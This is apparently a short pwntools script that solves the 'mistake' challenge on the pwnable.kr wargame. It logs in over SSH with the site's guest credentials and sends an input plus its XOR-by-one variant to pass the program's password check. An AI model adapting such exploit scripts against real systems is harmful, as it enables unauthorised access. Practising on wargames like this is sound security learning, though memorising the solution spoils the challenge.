from pwn import *
import time
s= ssh(host='pwnable.kr',user='mistake',password='guest',port=2222)
s.connected()
pro = s.process('/home/mistake/mistake')
print pro.recv()

fd_content = 'p4nda'+'\0'
fd_change = ""
for i in fd_content:
    fd_change += chr(ord(i) ^ 1)
pro.sendline(fd_content)
print pro.recv()
print fd_content
print '[+] Sleep over.'
pro.sendline(fd_change)
print pro.recv()
